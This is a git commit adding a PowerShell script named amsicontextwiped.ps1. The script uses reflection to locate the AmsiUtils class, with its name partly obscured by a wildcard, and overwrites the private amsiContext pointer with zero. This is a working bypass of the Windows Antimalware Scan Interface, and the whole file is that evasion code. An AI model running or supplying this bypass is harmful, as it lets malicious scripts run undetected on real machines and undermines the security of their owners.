b00b27082fb98110866ae24e0dae31ff0959e32e
paulpierce34 <33561650+paulpierce34@users.noreply.github.com>
2023-12-19 11:24:51 -0500

    Add files via upload

---
+++ amsicontextwiped.ps1
@@ -0,0 +1,20 @@
+﻿$a = [Ref].Assembly.GetTypes()
+
+Foreach ($Type in $a){
+if ($type.name -like "*iutils*"){
+$ams = $type
+$amstypes = $ams.GetFields('NonPublic,Static')
+}
+}
+
+
+## now that we have each of the different ams fields, lets wipe the context
+Foreach ($DifferentType in $amstypes){
+if ($DifferentType -like "*context*"){
+$amscontext = $DifferentType
+$Finalstage = $amscontext.GetValue($null)
+[IntPtr]$ptr = $Finalstage
+[Int32[]]$buf = @(0)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+}
+}
